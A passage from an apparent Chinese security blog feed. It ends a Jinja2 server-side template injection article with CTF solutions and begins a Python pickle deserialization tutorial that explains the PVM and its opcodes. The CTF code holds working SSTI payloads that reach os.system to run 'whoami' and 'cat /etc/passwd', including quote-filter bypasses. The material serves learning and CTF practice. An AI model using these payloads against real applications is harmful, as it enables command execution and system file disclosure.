沙箱逃逸经验总结：<br />https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</li><li>jinja2 - getattr<br />https://jinja.palletsprojects.com/en/3.1.x/templates/?highlight=getattr#variable</li><li>jinja2 - builtin-filters<br />https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters</li><li>jinja2 - 模板继承<br />https://jinja.palletsprojects.com/en/3.1.x/templates/#template-inheritance</li><li>jinja2 - PackageLoader<br />https://jinja.palletsprojects.com/en/3.1.x/api/?highlight=packageloader#loaders</li><li>jinja2 - for<br />https://jinja.palletsprojects.com/en/3.1.x/templates/#for</li><li>jinja2 - changes<br />https://jinja.palletsprojects.com/en/3.1.x/changes/</li><li>Python 类型注解<br />https://www.gairuo.com/p/python-type-annotations</li><li>pep-0585<br />https://peps.python.org/pep-0585/#implementation</li><li>standard generic classes<br />https://docs.python.org/zh-cn/3/library/stdtypes.html#standard-generic-classes</li></ol><h2 id="附">附</h2><p>OrangeKiller CTF 第 1 期题解</p><blockquote><p>jinjia2 se</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br><br>input_payload = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;]()&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(jinja2.Template(<span class="hljs-string">&quot;&#123;&#123;&quot;</span>+input_payload+<span class="hljs-string">&quot;&#125;&#125;&quot;</span>).render())<br></code></pre></td></tr></table></figure><blockquote><p>jinjia2 plus</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br><br>input_payload = <span class="hljs-string">&#x27;&#x27;&#x27;[whoami].__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__.system(().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(119)+().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(104)+().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(111)+().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(97)+().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(109)+().__class__.__base__.__subclasses__()[100].__init__.__globals__.__builtins__.chr(105))&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> input_payload <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&quot;&#x27;</span> <span class="hljs-keyword">in</span> input_payload:<br>    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Oh, Hacker!&quot;</span>) <br><br><span class="hljs-built_in">print</span>(jinja2.Template(<span class="hljs-string">&quot;&#123;&#123;&quot;</span>+input_payload+<span class="hljs-string">&quot;&#125;&#125;&quot;</span>).render())<br></code></pre></td></tr></table></figure><blockquote><p>jinjia2 pro</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br><br>input_payload = <span class="hljs-string">&#x27;&#x27;&#x27;[whoami].__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__.system(dict(whoami=x)|join)&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> input_payload <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&quot;&#x27;</span> <span class="hljs-keyword">in</span> input_payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(input_payload) &gt; <span class="hljs-number">500</span>:<br>    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Oh, Hacker!&quot;</span>) <br><br><span class="hljs-built_in">print</span>(jinja2.Template(<span class="hljs-string">&quot;&#123;&#123;&quot;</span>+input_payload+<span class="hljs-string">&quot;&#125;&#125;&quot;</span>).render())<br></code></pre></td></tr></table></figure><blockquote><p>jinjia2 pro max</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br><br>input_payload = <span class="hljs-string">&#x27;&#x27;&#x27;[whoami].__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__.system((dict(cat=x)|join)+dict.mro()[-1].__subclasses__()[100].__init__.__globals__.__builtins__.chr(32)+dict.mro()[-1].__subclasses__()[100].__init__.__globals__.__builtins__.chr(47)+dict(etc=x,passwd=x)|join(dict.mro()[-1].__subclasses__()[100].__init__.__globals__.__builtins__.chr(47)))&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> input_payload <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&quot;&#x27;</span> <span class="hljs-keyword">in</span> input_payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(input_payload) &gt; <span class="hljs-number">500</span>:<br>    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Oh, Hacker!&quot;</span>) <br><br><span class="hljs-built_in">print</span>(jinja2.Template(<span class="hljs-string">&quot;&#123;&#123;&quot;</span>+input_payload+<span class="hljs-string">&quot;&#125;&#125;&quot;</span>).render())<br></code></pre></td></tr></table></figure><p>这个 payload 应该还有优化的空间，留给橘友们研究吧~</p><p>当然，上面这几题用 <code>1&#125;&#125; &#123;&#123; payload &#125;&#125; &#123;&#123;1` 这样来闭合外层的 `&#123;&#123; &#125;&#125;</code>，再用 <code>&#123;% set %&#125;</code> 之类的也是 ok 的。</p><br><p style="text-align: center;"><font size="2px" color="gray">SSTI 这个系列的知识点真是越整理越多<br>罢了，拖更就好了<br><br>开摆！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SecMap 系列之 SSTI（jinja2）&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
    <category term="SSTI" scheme="https://www.tr0y.wang/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - 反序列化（Python）</title>
    <link href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/"/>
    <id>https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/</id>
    <published>2022-02-03T18:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>居家隔离实在是太无聊了，更一篇文章吧。</p><span id="more"></span><h2 id="介绍">介绍</h2><p>与 PHP 反序列化类似，Python 反序列化也是为了解决对象传输与持久化存储问题。</p><h3 id="相关库和方法">相关库和方法</h3><p>在 Python 中内置了标准库 <code>pickle</code>/<code>cPickle</code>（3.x 改名为 <code>_pickle</code>），用于序列化/反序列化的各种操作（Python 的官方文档中，称其为 封存/解封，意思其实差不多），比较常见的当然是 <code>dumps</code>（序列化）和 <code>loads</code>（反序列化）啦。其中 <code>pickle</code> 是用 Python 写的，<code>cPickle</code> 是用 C 语言写的，速度很快，但是它不允许用户从 <code>pickle</code> 派生子类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test)<br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)<br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure><p>结果如下：<br /><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">b</span>&#x27;\<span class="hljs-variable">x80</span>\<span class="hljs-variable">x04</span>\<span class="hljs-variable">x95</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x8c<span class="hljs-char escape_">\x08</span>__main__<span class="hljs-char escape_">\x94</span>\x8c<span class="hljs-char escape_">\x04</span>Test<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x94</span>)<span class="hljs-char escape_">\x81</span><span class="hljs-char escape_">\x94</span>&#125;<span class="hljs-char escape_">\x94</span>\x8c<span class="hljs-char escape_">\x01</span>a<span class="hljs-char escape_">\x94</span>K<span class="hljs-char escape_">\x01</span>sb.&#x27;</span><br><span class="hljs-string">1</span><br></code></pre></td></tr></table></figure></p><p>第一行看起来很复杂？马上说到。</p><h3 id="pvm">PVM</h3><p>要对序列化、反序列化很清楚的话，一定要了解 PVM，这背后又有非常多的细节。</p><p>首先，在调用 pickle 的时候，实际上是 <code>class pickle.Pickler</code> 和 <code>class pickle.Unpickler</code> 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。</p><p>PVM 由三部分组成：</p><ol type="1"><li>指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止（看上面的代码示例，序列化之后的结果最后是 <code>.</code>）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：<ol type="1"><li>opcode 是单字节的</li><li>带参数的指令用换行符来确定边界</li></ol></li><li>栈区：用 list 实现的，被用来临时存储数据、参数以及对象。</li><li>内存区：用 dict 实现的，为 PVM 的整个生命周期提供存储。</li></ol><p>最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法。</p><h4 id="pvm-协议">PVM 协议</h4><p>当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。</p><ol type="1"><li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容</li><li>v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。</li><li>v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。</li><li>v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。</li></ol><p>上面那个代码示例，我用的是 py3.8，如果要得到易读的序列化结果，在 dumps 中指定协议版本即可：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 指定版本</span><br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)  <span class="hljs-comment"># 注意，loads 能够自动识别反序列化的版本</span><br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure><br />结果如下：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Test<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>p2<span class="hljs-symbol">\n</span>Ntp3<span class="hljs-symbol">\n</span>Rp4<span class="hljs-symbol">\n</span>(dp5<span class="hljs-symbol">\n</span>Va<span class="hljs-symbol">\n</span>p6<span class="hljs-symbol">\n</span>I1<span class="hljs-symbol">\n</span>sb.&#x27;<br>1<br></code></pre></td></tr></table></figure></p><p>在序列化时，协议版本是自动检测出来的，所以诸如 loads 方法是不需要参数来指定协议的。</p><p>由于不同版本在利用的时候没有很大区别，所以本文以最易读的 v0 协议为例。</p><h4 id="opcode">opcode</h4><p>opcode 是 PVM 的灵魂，控制整个流程的运行。常用的我给翻译了一下，各位现查现用好了。<br /><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">MARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记<br>STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值<br>POP            = b&#x27;0&#x27;   # 丢弃栈顶对象<br>POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject<br>DUP            = b&#x27;2&#x27;   # duplicate top stack item<br>FLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象<br>INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象<br>BININT         = b&#x27;J&#x27;   # push four-byte signed int<br>BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int<br>LONG           = b&#x27;L&#x27;   # push long; decimal string argument<br>BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int<br>NONE           = b&#x27;N&#x27;   # 栈中压入 None<br>PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg<br>BINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stack<br>REDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈<br>STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象<br>BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument<br>SHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytes<br>UNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象<br>BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argument<br>APPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中<br>BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()<br>GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈<br>DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果<br>EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典<br>APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中<br>GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈<br>BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte arg<br>INST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）<br>LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg<br>LIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表<br>EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表<br>OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，<br>PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]<br>BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte arg<br>LONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte arg<br>SETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中<br>TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果<br>EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组<br>SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中<br>BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding<br><br>TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py<br>FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py<br></code></pre></td></tr></table></figure></p><p>当然，这些都是 v0 协议的 opcode，其他版本的协议会新增/替换一些 opcode，详见资料 2。</p><p>以上面那个 <code>b'ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.'</code> 为例，我们来解读一下这个序列化结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">c copy_reg _reconstructor: stack[copy_reg._reconstructor]<br><br>p <span class="hljs-number">0</span>: memo[copy_reg._reconstructor]<br><br>(: stack[(, copy_reg._reconstructor]<br><br>c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">1</span>: memo[copy_reg._reconstructor, __main__.Test]<br><br>c __builtin__ <span class="hljs-built_in">object</span>: stack[__builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">2</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>]<br><br>N: stack[<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>t: stack[(<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), copy_reg._reconstructor]<br><br>p <span class="hljs-number">3</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test)]<br><br>R stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">4</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>(: stack[(, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>d: stack[&#123;&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">5</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;]<br><br>V a: stack[<span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">6</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;, <span class="hljs-string">&quot;a&quot;</span>]<br><br>I <span class="hljs-number">1</span>: stack[<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>s: stack[&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>b: stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]  <span class="hljs-comment"># set a = 1</span><br><br>.: []  <span class="hljs-comment"># 返回 &lt;__main__.Test at 0x160578603d0&gt;</span><br></code></pre></td></tr></table></figure><p>我感觉，整个过程有点像语法分析里的 LR 算法，不断移进-规约。</p><p>虽然这个结果的可读性好了很多，但是依旧不容易读懂。</p><p>所以 Python 官方提供了工具，叫 <code>pickletools</code>，它的作用主要是：</p><ol type="1"><li>可读性较强的方式展示一个序列化对象（<code>pickletools.dis</code>）</li><li>对一个序列化结果进行优化（<code>pickletools.optimize</code>）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-built_in">print</span>(pickletools.dis(serialized))<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;copy_reg _reconstructor&#x27;</span><br>   <span class="hljs-number">25</span>: p    PUT        <span class="hljs-number">0</span><br>   <span class="hljs-number">28</span>: (    MARK<br>   <span class="hljs-number">29</span>: c        GLOBAL     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-number">44</span>: p        PUT        <span class="hljs-number">1</span><br>   <span class="hljs-number">47</span>: c        GLOBAL     <span class="hljs-string">&#x27;__builtin__ object&#x27;</span><br>   <span class="hljs-number">67</span>: p        PUT        <span class="hljs-number">2</span><br>   <span class="hljs-number">70</span>: N        NONE<br>   <span class="hljs-number">71</span>: t        TUPLE      (MARK at <span class="hljs-number">28</span>)<br>   <span class="hljs-number">72</span>: p    PUT        <span class="hljs-number">3</span><br>   <span class="hljs-number">75</span>: R    REDUCE<br>   <span class="hljs-number">76</span>: p    PUT        <span class="hljs-number">4</span><br>   <span class="hljs-number">79</span>: (    MARK<br>   <span class="hljs-number">80</span>: d        DICT       (MARK at <span class="hljs-number">79</span>)<br>   <span class="hljs-number">81</span>: p    PUT        <span class="hljs-number">5</span><br>   <span class="hljs-number">84</span>: V    UNICODE    <span class="hljs-string">&#x27;a&#x27;</span><br>   <span class="hljs-number">87</span>: p    PUT        <span class="hljs-number">6</span><br>   <span class="hljs-number">90</span>: I    INT        <span class="hljs-number">1</span><br>   <span class="hljs-number">93</span>: s    SETITEM<br>   <span class="hljs-number">94</span>: b    BUILD<br>   <span class="hljs-number">95</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这个要比自己分析序列化结果清晰多了。</p><p>细心的橘友们会注意到，在上面那个人工分析序列化的过程中，memo 一直是只有压入，没有弹出，所以 memo 里的数据压根就用不着，那么也有没必要压入了。所以上面的序列化结果完全可以把 <code>pn</code> 都去掉，再把不需要的 <code>\n</code> 移除，优化为：<code>b'ccopy_reg\n_reconstructor\n(c__main__\nTest\nc__builtin__\nobject\nNtR(dVa\nI1\nsb.'</code>，我们来执行一下试试：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/050a2946-9b39-4d74-a074-459fd1f71d80.png!blog#width-zoom8" /></p><p>当然，也可以用 <code>pickletools.optimize</code> 自动优化：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/282481f9-d78d-45db-aa57-91c9f2fbbea1.png!blog#width-zoom8" /></p><p>虽然这个优化结果与我们手动优化是一模一样的，但是在遇到复杂的序列化结果时，最好还是用这个方法来搞。</p><h3 id="小结">小结</h3><p>由于在反序列化的时候，这个对象要能在当前环境上下文中创建，所以在实际的利用过程中，那些默认加载的库、标准库（可被自动 import）就成了首选的类，比如 <code>os</code>，它有 <code>system</code> 方法。</p><p>对于 Python 可以被 pickle/unpickle 的对象以及其他一些注意事项，可以参考官方文档，见资料 3</p><p>我这里列出几点比较重要的：</p><ol type="1"><li>函数（内置函数或用户自定义函数）在被封存时，引用的是函数全名（这就是为什么 <code>lambda</code> 函数不可以被封存：所有的匿名函数都有同一个名字：<code>&lt;lambda&gt;</code>）。这意味着只有函数所在的模块名，与函数名会被封存，函数体及其属性不会被封存。因此，在解封的环境中，函数所属的模块必须是可以被导入的，而且模块必须包含这个函数被封存时的名称，否则会抛出异常</li><li>类也只封存名称，所以在解封环境中也有和函数相同的限制。注意，类体及其数据不会被封存，只有实例数据会被封存，所以在下面的例子中类属性 attr 不会存在于解封后的环境中：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span 